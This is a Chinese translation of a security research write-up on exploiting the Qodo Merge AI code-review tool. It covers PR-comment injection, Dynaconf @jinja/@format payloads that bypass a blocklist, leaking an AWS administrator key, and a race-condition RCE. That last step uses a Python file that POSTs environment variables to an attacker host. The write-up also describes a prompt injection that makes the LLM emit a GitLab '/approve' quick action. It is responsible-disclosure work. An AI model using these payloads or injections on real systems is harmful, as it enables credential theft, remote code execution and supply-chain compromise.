#  CI/CD安全案例：从PR评论到RCE、AWS管理员密钥泄露  
Dubito
                    Dubito  云原生安全指北   2026-02-04 00:35  
  
   
  
> 注：本文翻译自 Kudelski Security - Nils Amiet 的文章  
《How We Exploited Qodo: From a PR Comment to RCE and an AWS Admin Key - Leaked Twice》[1]  
，可点击文末“阅读原文”按钮查看英文原文。  
  
  
全文如下：  
## 一、引言  
  
在这篇博客文章中，我们将解释我们是如何泄露了 Qodo Merge Pro 具有管理员权限的 AWS 密钥的，以及我们是如何在其 GitHub 应用生产服务器上获取远程代码执行（RCE）权限的。一名恶意攻击者本可以接管他们的 AWS 基础设施，并通过此次对 GitHub 应用的攻击，获取对其客户代码库的写入权限，从而发起大规模的供应链攻击。  
  
这是一份技术性报告，详细介绍了我们去年夏天在   
Black Hat USA[2]  
 上披露的部分漏洞。这是我们在 AI 开发工具中发现的安全漏洞系列博客文章的一部分。本文还描述了一些此前未公开的漏洞。发布此文是为了提高业界认知，希望其他人能避免类似的漏洞。其次，我们想说明，仅仅了解提示词注入（prompt injection）是不够的。为了识别 AI 驱动应用程序中的风险，必须对相关环境、功能和系统有扎实的理解。否则，那些破坏性巨大的影响可能无法被识别。  
  
**注意：截至 2025 年 10 月，本博客文章中描述的所有漏洞均已修复。**  
  
向 Qodo 团队致意，他们在收到我们的负责任披露后迅速修复了这些问题。  
  
由于这篇博客文章是对去年发生事件的后续报道，我们先来快速回顾一下。  
## 二、第一回合：回顾  
  
在 2024 年 8 月，我撰文介绍了我在开源 AI 代码审查工具 Qodo Merge 中发现的   
2 个漏洞[3]  
。在那篇文章发布时，这些漏洞仍然可被利用。几个月后，我在   
38C3[4]  
 上就此漏洞做了一个演讲。之后，我便转向研究其他 AI 开发工具中的漏洞。  
  
几周后，在我完成   
对 CodeRabbit 的研究[5]  
 后，我注意到 Qodo 已经对我于 38C3 上披露的攻击进行了修复，于是决定再次深入研究一下。  
  
作为回顾，我们先快速介绍一下这两个漏洞是什么。  
  
**1)**  
 我们第一个针对 Qodo Merge 的攻击，允许我们泄露一个在 Qodo Merge GitHub Action 中使用的 GitHub 访问令牌。该令牌拥有对代码库的写入权限，因此，攻击者可以利用它来修改那些使用默认设置下的 Qodo Merge GitHub Action 的 GitHub 代码库。这包括操纵 Git 历史、更新现有的 GitHub 发布版本，以及进行横向移动，在某些情况下可能导致 GitHub 代码库中的密钥信息（secrets）泄露。  
  
该漏洞EXP是通过 GitHub PR请求的评论注入的。例如，可以在一个 PR 上发布以下评论，从而将 GitHub 访问令牌泄露到我们控制的攻击者服务器 1.2.3.4  
：  
  
![通过 GitHub PR 评论利用 Qodo Merge 泄露其 GitHub 访问令牌](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVcDlytTzTcib8apHraiaQBeQpgaXFga55wxW242KVZFIU0MlkVVanW9Pw/640?from=appmsg "null")  
  
通过 GitHub PR 评论利用 Qodo Merge 泄露其 GitHub 访问令牌  
  
**2)**  
 我们的第二个攻击，允许通过提示词注入在 GitLab 快速操作（quick-actions）上实现权限提升。这影响了那些在 GitLab 项目上（特别是使用 Qodo Merge） 的用户。实际上，我们可以诱导大语言模型输出一个 GitLab 快速操作，例如 /approve  
，然后由 Qodo Merge 将其发布到 GitLab 合并请求（Merge Request，MR）的评论中。随后，GitLab 将执行这个快速操作，例如，批准一个合并请求，而执行该操作所使用的权限可能高于原用户所拥有的权限。一个权限较低的恶意行为者可以利用此漏洞来提升自己的权限，并以这些提升后的权限（即 Qodo Merge 的权限）来执行 GitLab 快速操作。下图对此进行了更详细的说明。  
  
![通过 GitLab 快速操作实现从提示词注入到权限提升](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVak0ToZ52Go0ymBTG2APyFwjInx8wkuCQXDrChib1CKhGEGgEXJu6Viaw/640?from=appmsg "null")  
  
通过 GitLab 快速操作实现从提示词注入到权限提升  
## 三、第二回合：Dynaconf 绕过  
  
回顾完毕，我们继续讲述接下来的故事。  
  
如前所述，Qodo 针对这两个攻击方式都推出了修复。我们在此重点关注第一个，因为这是最有趣的一个。他们新增了一个禁止出现在 GitHub 评论中的参数列表。以下是该修复中引入的禁止参数列表：  
- • .base_url  
  
- • .bearer_token  
  
- • .enable_auto_approval  
  
- • .enable_local_cache  
  
- • .git_provider  
  
- • .jira_base_url  
  
- • .local_cache_path  
  
- • openai.key  
  
- • .override_deployment_type  
  
- • .personal_access_token  
  
- • .private_key  
  
- • .secret_provider  
  
- • .skip_keys  
  
- • .uri  
  
- • .url  
  
- • .webhook_secret  
  
由于 **.base_url**  
 现在被禁止，这确实阻止了我们最初的攻击方式，因为原始攻击中包含 .base_url  
：  
```
/ask What does this do? --github.base_url=http://1.2.3.4
```  
  
然而，这并未修复根本问题。让我们看看如何绕过这个限制。  
### 3.1 Dynaconf 简介  
  
Qodo Merge 使用一个名为   
Dynaconf[6]  
 的 Python 库来处理其内部配置。这是一个非常方便的应用程序配置管理库，因为它易于使用，并且具备一些有用的功能，例如从配置文件中读取一组键值对。  
  
![Python 配置管理](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVnXTMrVzw4KoU1pf4rdeOzUL6NJ9x0Jt3mSFB4OQF7rjQM1vQP4iaQJQ/640?from=appmsg "null")  
  
Python 配置管理  
  
的确，通常我们可以在一个 Dynaconf 对象上获取和设置键值对：  
```
from dynaconf import Dynaconfsettings = Dynaconf()key = "foobar"value = 42settings.set(key, value)print(settings.get("foobar") == 42)  # 输出 True
```  
  
或者，Dynaconf 对象也可以被构建，并用存储在配置文件中的键值对进行填充。这个配置文件可以用 Dynaconf 支持的各种格式编写，其中之一是 TOML。这就是 Qodo Merge 使用的配置文件格式。  
  
例如，一个名为 **configuration.toml**  
 的配置文件可以包含以下内容：  
```
[some_table];foo = "bar";name = "John";age = 42;
```  
  
然后，我们可以创建一个包含上述配置文件中存储的键值的 Dynaconf 对象：  
```
from dynaconf import Dynaconfsettings = Dynaconf(    settings_files=["configuration.toml"],)foo = settings.get("some_table.foo")name = settings.get("some_table.name")age = settings.get("some_table.age")print(foo == "bar")  # prints Trueprint(name == "John")  # prints Trueprint(age == 42)  # prints True
```  
### 3.2 绕过修复 1：Dynaconf 的动态变量  
  
现在我们对 Dynaconf 更熟悉了，让我们回到 Qodo Merge 上。每当 GitHub 评论包含 **--key=value**  
 时，Qodo Merge 就会在其内部的 Dynaconf 对象中将 **key**  
 设置为 **value**  
。所以，在我们上面的攻击中，Qodo Merge 会在其内部的 Dynaconf 设置对象上执行以下操作：  
```
settings.set("github.base_url", "http://1.2.3.4")
```  
  
但是，引入了禁止参数的修复阻止了这个特定的攻击。  
  
然而，事实证明，Dynaconf 拥有一些高级功能，默认情况下会导致意想不到的行为。事实上，除了管理键值对之外，当插入或修改一个键值对时，如果该值包含名为  
动态变量[7]  
的特殊语法，Dynaconf 会对其进行特殊的转换。  
  
例如，如果字符串以 @json  
 为前缀，Dynaconf 会将 JSON 字符串转换为字典：  
```
value = '@json {"foo": "bar"}'settings.set("key", value)print(settings.get("key") == dict(foo="bar"))# 输出 "True"
```  
  
它还会计算以 @jinja  
 为前缀的 Jinja 表达式：  
```
value = "@jinja {{ 2 + 2 }}"settings.set("key", value)print(settings.get("key") == "4")# 输出 "True"
```  
  
这些功能可以组合使用：  
```
value = '@json @jinja { "two_plus_two": "{{ 2 + 2 }}" }'settings.set("key", value)print(settings.get("key") == dict(two_plus_two="4"))# 输出 "True"
```  
  
利用这些 Dynaconf 功能，我们可以重写我们的攻击，使其实现与之前相同的目标，但不包含任何被禁止的参数。  
  
因此，我们从这样：  
```
/ask who are you? --github.base_url=http://1.2.3.4
```  
  
变成了这样：  
```
/ask who are you? "--github=@json @jinja {{\"{{\"[0]}}\"user_token\":\"{{this.GITHUB_TOKEN}}\",\"BASE_URL\":\"http://1.2.3.4\"{{\"}}\"[0]}}" "--github.user_token=@jinja {{this.GITHUB_TOKEN}}"
```  
  
我们将此问题报告给了 Qodo，他们推出了另一个修复，将 **.user**  
 也添加到了禁止参数列表中。修复安全问题可能很困难。  
  
确实，这个新修复阻止了我们针对第一个修复的绕过，但它仍然没有解决根本问题。  
### 3.3 绕过修复 2：使用 Dynaconf 高级功能  
  
于是，我们编写了另一个攻击，实现了相同目标，但不包含 **.base_url**  
 或 **.user**  
。这次我们使用了另一个技巧。我们使用 Jinja 表达式，通过 __setattr__()  
 直接修改 Dynaconf 对象。  
  
我们从这个：  
```
/ask who are you? "--github=@json @jinja {{\"{{\"[0]}}\"user_token\":\"{{this.GITHUB_TOKEN}}\",\"BASE_URL\":\"http://1.2.3.4\"{{\"}}\"[0]}}""--github.user_token=@jinja {{this.GITHUB_TOKEN}}"
```  
  
变成了这个：  
```
/ask who are you? "--github=@json @jinja {{\"{{\"[0]}}\"user_token\":\"{{this.GITHUB_TOKEN}}\",\"BASE_URL\":\"http://1.2.3.4\"{{\"}}\"[0]}}" "--github.foo=42" "--github.foo=@jinja {{this.github.__setattr__(\"user_token\", this.GITHUB_TOKEN)}}"
```  
  
这个攻击仍然有效，因为它不包含任何被禁止的参数。按照这个速度，这种猫鼠游戏本可以无限期地进行下去。  
  
我们将此问题报告给了 Qodo，然后转向了其他研究。几天后，我注意到 Qodo 有一个该工具的 SaaS 版本，名为 Qodo Merge Pro，于是决定也去研究一下。  
### 3.4 Qodo Merge Pro  
  
虽然 Qodo Merge 是开源的，但 Qodo Merge Pro 是作为 GitHub 应用提供的 SaaS 版本。  
  
在我撰写本文时，Qodo Merge Pro 已拥有超过 15,000 次安装。安装时，用户需要选择他们希望在哪些代码库上安装 Qodo Merge Pro。在此过程中，用户会授予 Qodo 对所选代码库的读取和写入权限。具体授予的  
权限集[8]  
如下：  
```
"permissions": {    "actions": "read",    "checks": "read",    "contents": "write",    "discussions": "write",    "issues": "write",    "metadata": "read",    "pull_requests": "write"},
```  
  
Qodo Merge 和 Qodo Merge Pro 都有一个功能，允许用户导出存储在 Dynaconf 对象中的非敏感键值对。这可以通过在评论中写入 **/config**  
 来实现。应用会回复一条包含这些键值对的评论。  
  
![使用 /config 导出 Dynaconf 键值对](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVReANqZkviaPpu0JRiaD92gwWxZzyk8wegPiacd5iat429oHUhSSfXZia4iaw/640?from=appmsg "null")  
  
使用 /config 导出 Dynaconf 键值对  
  
Qodo Merge 会导出整个配置对象，但会移除所有密钥信息（secrets），例如从 **.secrets.toml**  
 文件加载的任何内容（该文件通常是 Qodo Merge 存放密钥信息的地方），或者特定的密钥，例如 LLM 提供商的 API 密钥。以下是 Qodo Merge 代码中的一个片段，展示了如何构建要通过 /config  
 导出的 Dynaconf 对象：  
```
def _prepare_pr_configs(self) -> str:        conf_file = get_settings().find_file("configuration.toml")        conf_settings = Dynaconf(settings_files=[conf_file])        configuration_headers = [header.lower() for header in conf_settings.keys()]        relevant_configs = {            header: configs for header, configs in get_settings().to_dict().items()            if (header.lower().startswith("pr_") or header.lower().startswith("config")) and header.lower() in configuration_headers        }        skip_keys = ['ai_disclaimer', 'ai_disclaimer_title', 'ANALYTICS_FOLDER', 'secret_provider', "skip_keys", "app_id", "redirect",                     'trial_prefix_message', 'no_eligible_message', 'identity_provider', 'ALLOWED_REPOS',                     'APP_NAME', 'PERSONAL_ACCESS_TOKEN', 'shared_secret', 'key', 'AWS_ACCESS_KEY_ID', 'AWS_SECRET_ACCESS_KEY', 'user_token',                     'private_key', 'private_key_id', 'client_id', 'client_secret', 'token', 'bearer_token', 'jira_api_token','webhook_secret']        partial_skip_keys = ['key', 'secret', 'token', 'private']        extra_skip_keys = get_settings().config.get('config.skip_keys', [])        if extra_skip_keys:            skip_keys.extend(extra_skip_keys)        skip_keys_lower = [key.lower() for key in skip_keys]
```  
  
因此，在导出的键值对中，我们本不应找到任何密钥信息。到目前为止，这确实是事实。然而，还有另一种方式。  
  
与 Qodo Merge 一样，Qodo Merge Pro 也允许用户在代码库的根目录放置一个配置文件来覆盖某些设置。那么，如果我们覆盖了一些键值对，并将其与 Dynaconf 的特殊功能结合使用呢？这下就有意思了！  
#### 3.4.1 窃取密钥信息（secrets）  
  
我们在代码库的根目录放置了一个 **.pr_agent.toml**  
 文件，内容如下：  
```
[pr_update_changelog]extra_instructions="@format  pwned: ```{env}```"
```  
  
这个操作等同于运行以下代码：  
```
settings.set("pr_update_changelog.extra_instructions", "@format pwned: ```{env}```")
```  
  
Dynaconf 的动态变量 @format  
 将被计算，**{env}**  
 会被替换为运行进程的所有环境变量。  
  
接下来，我们只需再次要求 Qodo Merge Pro 通过 **/config**  
 命令导出其配置，这就是我们的发现：  
  
![环境变量被复制到了 pr_update_changelog.extra_instructions 这个键中](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVJgYNO99aTKibtzLu1VWB9zWnTJy7sib3cW5KFweX7gZiaibNqV5l0j5YWw/640?from=appmsg "null")  
  
环境变量被复制到了 pr_update_changelog.extra_instructions 这个键中  
  
所有环境变量都在一个非常长的单行中。以下是以更易读的格式整理出的关键部分。为简洁起见，省略了一些无关变量：  
```
==================== PR_UPDATE_CHANGELOG ====================pr_update_changelog.push_changelog_changes = Falsepr_update_changelog.extra_instructions = "pwned: ```environ({'CONFIG.APP_NAME': 'pr-agent-pro-github', 'CONFIG.ALLOWED_REPOS': '(CENSORED)', 'CONFIG.ANALYTICS_FOLDER': '/logs', 'PROMETHEUS_MULTIPROC_DIR': '/app/prometheus_metrics', 'PYTHON_SHA256': '24887b92e2afd4a2ac602419ad4b596372f67ac9b077190f459aba390faf5550', '_': '/usr/local/bin/gunicorn', 'SERVER_SOFTWARE': 'gunicorn/22.0.0', 'TIKTOKEN_CACHE_DIR': '/usr/local/lib/python3.12/site-packages/litellm/litellm_core_utils/tokenizers', 'AWS_ACCESS_KEY_ID': 'AKI(CENSORED)', 'AWS_SECRET_ACCESS_KEY': '/l33t(CENSORED)', 'AWS_REGION_NAME': '(CENSORED)'})```"pr_update_changelog.add_pr_link = True
```  
  
这些环境变量中显然包含一个 AWS 密钥。但这并非一个普通的 AWS 密钥。它是一个非常“l33t”（高手级）的 AWS 密钥。不仅因为它的值以 **/l33t**  
 开头，更因为它的权限。你能猜到它拥有什么权限吗？当然，是 AdministratorAccess 权限 :) 让我们看看如何获取这些信息。  
#### 3.4.2 枚举权限  
  
让我们看看如何使用 AWS CLI 工具列出权限。首先，我们配置 CLI 工具以使用泄露的 AWS 密钥：  
```
$ aws configureAWS Access Key ID [None]: AKI(CENSORED)AWS Secret Access Key [None]: /l33t(CENSORED)Default region name [None]: (CENSORED)Default output format [None]:
```  
  
接下来，我们检查与此 AWS 密钥关联的用户身份：  
```
$ aws iam get-user{    "User": {        "Path": "/",        "UserName": "Administrator",        "UserId": "(CENSORED)",        "Arn": "arn:aws:iam::(CENSORED):user/Administrator",        "CreateDate": "2022-08-07T12:54:51Z",        "PasswordLastUsed": "2025-03-18T08:19:15Z",        "Tags": [            {                "Key": "(CENSORED)",                "Value": "(CENSORED)"            }        ]    }}
```  
  
用户名为 **Administrator**  
。到目前为止，这听起来相当不错。但让我们进一步确认。  
  
然后，我们枚举 Administrator  
 用户所属的组：  
```
$ aws iam list-groups-for-user --user-name Administrator{    "Groups": [        {            "Path": "/",            "GroupName": "Administrators",            "GroupId": "(CENSORED)",            "Arn": "arn:aws:iam::(CENSORED):group/Administrators",            "CreateDate": "2022-08-07T12:54:17Z"        }    ]}
```  
  
**Administrator**  
 用户在一个名为 **Administrators**  
 的组中（注意末尾有个“s”）。最后，我们列出附加到 Administrators 组的策略：  
```
$ aws iam list-attached-group-policies --group-name Administrators{    "AttachedPolicies": [        {            "PolicyName": "AdministratorAccess",            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"        }    ]}
```  
  
Administrators 组附加了 AdministratorAccess 策略。这是一个内置的 AWS 策略，授予管理员权限。现在得到了确认。我们泄露了一个拥有 AdministratorAccess 权限的 AWS 密钥，这赋予了我们完全访问 Qodo Merge Pro 的 AWS 账户中所有服务和资源的权限！  
  
![具有 AdministratorAccess 策略权限的 AWS 密钥](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVOyUYQt5416KeO34Jl2FmztTB4cItmgRYGgA9SuLswfYIqab1RPGu5g/640?from=appmsg "null")  
  
具有 AdministratorAccess 策略权限的 AWS 密钥  
  
来源：https://docs.aws.amazon.com/aws-managed-policy/latest/reference/AdministratorAccess.html  
  
在我们负责任地向 Qodo 披露此事后，他们最终为此问题应用了适当的修复。他们通过将 **AUTO_CAST_FOR_DYNACONF**  
 环境变量设置为“**false**  
”，禁用了 Dynaconf 的动态变量功能。这有效地禁用了诸如解释 @format  
、@json  
 或 @jinja  
 等 Dynaconf 动态变量。这终于修复了根本问题。为 Qodo 的修复点赞。  
## 四、第三回合：引用与文档  
  
但这并不是结束。几个月后，在我撰写这篇博客文章时，我再次查看了 Dynaconf 的网站，注意到   
Dynaconf 支持使用 .py  
 文件作为配置文件[9]  
。我立刻想到这可能被利用。  
  
![Dynaconf 支持多种配置文件格式，包括 Python 文件](https://mmbiz.qpic.cn/sz_mmbiz_png/d7OsfYudM4ZicV6lUREBqUW2frY08zsoVVaMaMHxw4pnIW2tkXPKzibztne3m4e2mntkKlrGPlpCxey0CR4B5RKQ/640?from=appmsg "null")  
  
Dynaconf 支持多种配置文件格式，包括 Python 文件  
  
Dynaconf 文档中包含一个示例，展示了配置文件如何引用（include）其他配置文件。例如，一个 **configuration.toml**  
 文件可以引用另一个名为 **other.toml**  
 的文件，甚至可以是另一种格式的文件，例如名为 **config.py**  
 的 Python 文件。这可以通过在配置文件中放置一个名为 **dynaconf_include**  
 的键来实现，该键的关联值是一个列表，包含需要引用的文件路径。这意味着，我们可以在 GitHub 代码库的根目录放置一个 **.pr_agent.toml**  
 文件，如果该文件包含了一个 .py  
 文件，Qodo Merge Pro 就会执行所包含的 Python 文件中的代码。以下是一个可以实现此功能的示例配置文件：  
```
dynaconf_include = ["config.py"][default]foo="bar"
```  
  
现在，要使攻击者能够利用这一点，需要在 Qodo Merge Pro GitHub 应用服务器本地存在一个已有的 Python 文件，该文件在执行时能进行恶意操作。到目前为止，我们可以执行文件系统中已存在的任何 Python 文件。但是，由于无法向这些文件传递参数，我们利用现有文件能做的事情非常有限。如果我们能写入一个任意的 Python 文件然后执行它，那将会变得有趣得多。这时，/help_docs  
 工具就派上用场了。  
### 4.1 /help_docs 工具  
  
Qodo Merge Pro 最近引入了一个新工具，可以通过在 PR 评论中写入类似 /help_docs some question?  
 的文本来调用。  
  
该工具可以配置为对包含文档文件（例如 Markdown 文件）的仓库进行 git 克隆。这样，当用户使用 /help_docs  
 调用该工具时，工具会尝试根据 git 克隆仓库中存在的文档文件内容来回答问题。代码库会被 git 克隆到 /tmp  
 下的一个随机名称的临时目录中。此外，Qodo Merge Pro 在读取完其中的文件后会迅速删除该目录。如果我们能在文件被删除之前执行 Python 文件，这里就存在一个可利用的竞争条件漏洞。  
  
实际上，可以通过精心构造一个包含恶意 Python 文件的文档代码库来利用此漏洞。然后，要求 Qodo Merge Pro 基于此代码库回答问题，这样它就会将代码库 git 克隆到 /tmp  
 下的某个目录中，从而将我们的恶意 Python 文件复制到 /tmp  
 下的某个位置。  
  
然而，在当前的配置下利用这一点并不简单，因为触发 dynaconf_include  
 的时间窗口非常短，git 克隆完成后，git 克隆的代码库会很快被删除。但是，可以通过在我们的文档代码库中添加 100,000 个虚拟的 .txt  
 文件来延迟这个操作。现在，Qodo Merge Pro 在删除临时目录之前，需要花费几秒钟遍历所有这些文件，从而留下了更大的利用时间窗口。  
  
拼图的最后一块是找到恶意 Python 文件的确切位置，因为它被克隆到了一个随机命名的临时目录中，攻击者无法预先猜出这个文件名。不过，由于 dynaconf_include  
 允许路径中包含通配符（globs），这实际上不是问题。可以使用通配符来匹配任何包含我们 Python 文件的子目录。  
  
总结一下，利用此漏洞的详细步骤如下：  
- • **步骤 1**  
：创建一个私有的 GitHub 代码库 A  
  
- • 在此代码库上安装 Qodo Merge Pro  
  
- • 在此代码库中创建一个 **.pr_agent.toml**  
 文件，内容如下：  
  
```
dynaconf_include = ["/tmp/**/aaaa_some_unique_filename_very_unique.py"][default]foo="bar"
```  
- • **步骤 2**  
：创建一个私有的 GitHub 代码库 B  
  
- • 在此代码库上安装 Qodo Merge Pro  
  
- • 在此代码库中创建一个 .pr_agent.toml  
 文件，内容如下：  
  
```
[pr_help_docs]repo_url = "https://github.com/myusername/repoC.git"docs_path = "docs"            # 存放文档的文件夹repo_default_branch = "main"  # 当 repo_url 被覆盖时使用的分支supported_doc_exts = [".md", ".mdx", ".rst"]
```  
- • **步骤 3**  
：在 https://github.com/myusername/repoC 创建一个公开的 GitHub 代码库 C  
  
- • 在此代码库中，创建一个 **docs**  
 文件夹  
  
- • 在 **docs/md/foobar.md**  
 中创建一个虚拟的 .md 文件，内容随意  
  
- • 在 **docs/other/**  
 中创建 100,000 个虚拟的 .txt 文件，命名为 file{1-100000}.txt  
，每个文件包含一个字符，例如 "a"  
  
- • 在 **docs/**  
 中创建一个恶意的 Python 文件 aaaa_some_unique_filename_very_unique.py  
，内容如下，其中 1.2.3.4  
 是我们控制的一个用于记录传入 HTTP 请求的 Web 服务器。注意，此文件的内容可以替换为任何将在 Qodo Merge Pro GitHub 应用服务器上执行的 Python 代码：  
  
```
import osimport jsonimport urllib.request# 环境变量通过 http 发送到这里payload = dict(os.environ)# 转换为 JSON 并编码json_data = json.dumps(payload).encode("utf-8")url = "http://1.2.3.4"# 创建一个带有 JSON headers 的请求req = urllib.request.Request(    url,    data=json_data,    headers={"Content-Type": "application/json"},    method="POST")# 发送请求并读取响应with urllib.request.urlopen(req) as response:    result = response.read().decode("utf-8")FOO="BAR"
```  
- • **步骤 4**  
：准备触发竞争条件  
  
- • 在代码库 A 中创建一个PR请求（任何PR请求都可以，内容不重要）  
  
- • 关闭这个PR请求，但准备好通过点击 GitHub 上的“重新打开”按钮重新打开它  
  
- • 这是最简单的方法，因为当 PR 被重新打开时，Qodo Merge Pro 会重新评估 Dynaconf 配置文件。  
  
- • 在代码库 B 中创建一个PR请求（内容不重要）  
  
- • **步骤 5**  
：漏洞利用  
  
- • 在代码库 B 的PR请求上写一条 PR 评论，内容为 /help_docs some question?  
  
- • 等待大约 5 秒钟  
  
- • 这给了 Qodo Merge Pro 一些时间来 git clone  
 代码库 C，但等待时间不宜过长，否则它在读取完所有虚拟文件后就会删除临时代码库。  
  
- • 重新打开代码库 A 的PR请求以触发 dynaconf_include  
  
- • 在服务器 1.2.3.4  
 上收集泄露的环境变量 :)  
  
- • 如果第一次尝试没有成功，可以重复步骤 5，但使用一个略微不同于 5 秒的等待时间，直到成功。我第二次尝试就成功了。  
  
在我们的服务器 1.2.3.4  
 上，我们收到了泄露的环境变量，其中再次包含了他们的 AWS 密钥！我惊讶地发现 AWS 密钥与之前相同，并且自我们披露前一个漏洞以来，密钥竟然没有轮换。此外，该密钥仍然拥有 AdministratorAccess 权限。再一次，我们获得了对他们 AWS 基础设施的完全访问权限，但这一次，我们还拥有了一种能在 GitHub 应用生产服务器上直接获取 RCE 的方法。  
### 4.2 修复措施  
  
在我们负责任地向 Qodo 披露了这个新漏洞后，他们迅速进行了修复。  
  
他们的修复方案禁用了 Dynaconf 的核心加载器（core_loaders），并添加了一个自定义的内部加载器，该加载器恢复了默认功能，但禁止了攻击者可能利用的包含（includes）、预加载（preloads）以及其他各种危险的 Dynaconf 功能。以下是实现此修复的两个PR请求：  
- • https://github.com/qodo-ai/pr-agent/pull/2077  
  
- • https://github.com/qodo-ai/pr-agent/pull/2087  
  
Qodo 还轮换了他们的 AWS 密钥。一旦密钥信息（secrets）泄露，立即轮换它们至关重要。即使安全研究人员并非恶意人士，一旦密钥泄露，就应假定其已失陷。并且，由于此密钥可以访问其他密钥信息（secrets），其他相关密钥也应一并轮换。AdministratorAccess 权限非常危险，授予权限时应遵循最小权限原则。  
### 4.3 影响总结  
  
我们成功获取了 Qodo Merge Pro 的 AWS 管理员密钥。  
  
让我们反思一下这意味着什么。一个恶意人员一旦掌握了这个 AWS 密钥，可能造成巨大的破坏。  
  
事实上，这意味着他们可以执行以下操作，仅举几例：  
- • 在 AWS Secrets Manager 中列出并访问密钥信息  
  
- • 这些密钥信息可能授予访问第三方服务的权限  
  
- • 枚举、创建、修改或删除资源（VM 或在其 Kubernetes 集群中运行的容器）  
  
- • 这包括对生产服务的完全访问权限  
  
- • 由于该密钥具有 AdministratorAccess 权限，这是一张“万能通行证”，攻击者可以由此在其生产系统中获得 RCE 权限  
  
- • 获取免费的 AWS 资源  
  
- • 管理员密钥授予对所有 AWS 服务的完全访问权限，而 Qodo 支付账单  
  
- • 实施拒绝服务攻击  
  
- • 获取对客户代码库的读取/写入权限  
  
- • 事实上，由于 Qodo Merge Pro 用户在安装时授予了对他们代码库的读取/写入权限，拥有此密钥的攻击者也可以向这些代码库写入内容，从而可能对高价值代码库发起大规模的供应链攻击，例如被许多人使用的库——这与发生在 CodeRabbit 的情况类似。  
  
- • 攻击者还可以访问 Qodo Merge Pro 有权访问的任何私有代码库。  
  
- • 如上所述，截至撰写本文时，Qodo Merge Pro 已拥有超过 15,000 次安装，每次安装都授予了对 1 个或多个代码库的读取/写入权限，因此这影响了相当数量的代码库。  
  
这是一个具有严重影响的严重漏洞。  
  
在第三回合中，我们额外直接在 Qodo Merge Pro 的 GitHub 应用服务器上获得了 RCE 权限。因此，不仅让我们再次泄露了他们的 AWS 密钥，并产生了如上所述的相同影响，还可以直接在机器上执行任意代码。这意味着，在这种情况下，甚至不需要 AWS 密钥来读取/写入 Qodo Merge Pro 用户的代码库，因为我们已经在该生产环境的 Qodo Merge Pro GitHub 应用机器上拥有 RCE 权限，而这台机器本身就能访问用户代码。  
## 五、负责任的披露  
  
我们于 2025 年 4 月通过电子邮件向 Qodo 负责任地披露了第一个关键漏洞。他们确认了问题并在第二天推出了修复。此漏洞现已在 Qodo Merge Pro 中修复。  
  
那么开源的 Qodo Merge 呢？Qodo 于 5 月 17 日发布了   
v0.29[10]  
，其中包含了针对此漏洞的修复。因此，开源版本也已修复。  
  
我们同样于 2025 年 9 月通过电子邮件向 Qodo 负责任地披露了第二个关键漏洞（第三回合 - Dynaconf include + /help_docs  
），目前也已修复。  
  
在披露了第三回合的漏洞后，Qodo 表示，泄露的具有管理员权限的 AWS 密钥仅用于开发环境，该环境不存储任何客户数据。我们向他们发送了其 EC2 实例名称和密钥管理器中密钥名称的列表，其中一些名称包含“prod”，表明其开发和生产环境可能存在重叠：  
```
$ aws secretsmanager list-secrets | jq -r '.SecretList.[].Name'      ******-prod-********-service-account      ******-prod-**********-key      ******-prod-*******-key      ******-prod-******-auth      ******-prod-******-auth      ******-prod-******-key      ******-prod-**********-token      ****************************************************************************      ****************************************************************************      ****************************************************************************      ****************************      **********      *************************      *******************      ****************      ****************      ************************      **********************      ********************
```  
```
$ aws ec2 describe-instances \        --query 'Reservations[*].Instances[*].Tags[?Key==`Name`].Value | []' \        --output text      **********************      *******************      ******-prod-******      ********************      ************************      ************************      **************      *****************      ********      ************      ********      ********************      *********************
```  
  
Qodo 回复称这些是命名不当（misnamed）。  
  
无论该 AWS 密钥访问的是何种环境，生产环境 GitHub 应用服务器上的 RCE 漏洞都可能被利用来获取对客户代码库的读写权限。  
  
以下是披露时间线的总结：  
- • **2025年3月12日**  
  
- • 通过电子邮件向 Qodo 披露了 Qodo Merge（开源版）修复方案1的绕过方法  
  
- • **2025年3月**  
  
- • 多次邮件往来  
  
- • **2025年4月7日**  
  
- • 通过电子邮件向 Qodo 披露了 Qodo Merge（开源版）修复方案2的绕过方法  
  
- • 通过电子邮件向 Qodo 披露了 Qodo Merge Pro AWS 密钥泄露问题  
  
- • **2025年4月8日**  
  
- • Qodo 确认他们已开始调查  
  
- • 几小时后，Qodo 确认他们能够复现问题并已部署修复  
  
- • **2025年5月17日**  
  
- • Qodo Merge v0.29 发布，修复了开源版 Qodo Merge 中的问题  
  
- • **2025年9月30日**  
  
- • 通过电子邮件向 Qodo 披露了通过 dynaconf_include 和 /help_docs  
 实现 RCE 的漏洞  
  
- • **2025年10月22日**  
  
- • Qodo 确认他们已完全修复该漏洞  
  
- • **2025年10月24日**  
  
- • Qodo 确认他们已轮换了其 AWS 密钥  
  
- • **2025年12月30日**  
  
- • Qodo 发布了与此相关的 2 篇博客文章  
  
- • https://www.qodo.ai/blog/security-at-qodo-in-2026-our-commitment-recent-learnings-and-whats-next/  
  
- • https://www.qodo.ai/blog/our-response-to-a-recent-vulnerability-disclosure-actions-taken-continuous-improvement/  
  
## 六、结论  
  
修复安全漏洞可能很困难。阻止一种攻击方式是一回事，但这可能只解决了一半问题。应该确保覆盖攻击的所有变体，并直接解决根本问题。软件开发人员通常依赖于具有许多功能的第三方库。应该仔细审查这些依赖项，并确保这些库提供的功能已在威胁模型中涵盖。  
  
权限仍然是一个问题。虽然拥有一把能打开所有门的钥匙可能很方便，但如果这把钥匙落入坏人之手，后果可能是毁灭性的。一旦密钥信息泄露，应立即进行轮换。再次强调，安全应该从第一天就内置其中，并且是一个持续的过程。这可能会发生在任何人身上，问题不在于“如果发生”，而在于“何时发生”以及你是否为此做好了准备。设计系统以在发生泄露时最小化影响，并为泄露情况制定应对计划，这是一个良好的开端。  
#### 引用链接  
  
[1]  
